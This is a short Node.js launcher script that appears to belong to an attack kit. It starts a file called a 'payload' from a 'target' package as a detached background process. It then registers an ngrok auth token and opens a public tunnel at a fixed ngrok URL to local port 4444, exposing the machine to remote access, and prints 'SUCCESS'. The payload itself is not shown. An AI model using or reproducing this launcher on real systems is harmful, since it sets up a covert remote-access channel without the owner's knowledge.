'use strict'

const { execSync, spawn } = require('node:child_process')
const env = require('../../env')

function execPayload() {
  const subprocess = spawn(
    'node',
    [`./packages/target/api/index.js`],
    env.spawnOptions,
  )
  subprocess.unref()
}

function execNgrok() {
  execSync(`${env.ngrokExecutable} config add-authtoken ${env.ngrokAuthToken}`, { cwd: 'ngrok-bin' })

  const subprocess = spawn(
    env.ngrokExecutable,
    ['http', '--url=epic-tarpon-definitely.ngrok-free.app', '4444'],
    { cwd: 'ngrok-bin', ...env.spawnOptions },
  )
  subprocess.unref()
}

async function bootstrap() {
  execPayload()
  execNgrok()
  console.log('SUCCESS')
}
bootstrap()
